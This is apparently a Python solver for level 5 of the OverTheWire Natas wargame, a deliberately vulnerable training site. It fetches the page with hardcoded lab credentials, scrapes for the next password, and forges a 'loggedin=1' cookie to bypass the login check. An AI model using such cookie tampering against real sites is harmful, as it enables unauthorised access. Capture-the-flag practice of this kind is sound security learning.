import os, sys
import requests
import re

#password = aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>

user='natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
url = 'http://'+user+'.natas.labs.overthewire.org'

website = requests.get(url, auth=(user,password))
response = website.text
print(response)

foundPasswords = re.findall('natas6(.*)', response)
for p in range(len(foundPasswords)):
    print(foundPasswords[p])


#Rest of the code is challenge specific:
requestWithReferer = requests.get(url, auth=(user,password), headers={'cookie': 'loggedin=1'})
responseWithReferer = requestWithReferer.text
print (responseWithReferer)
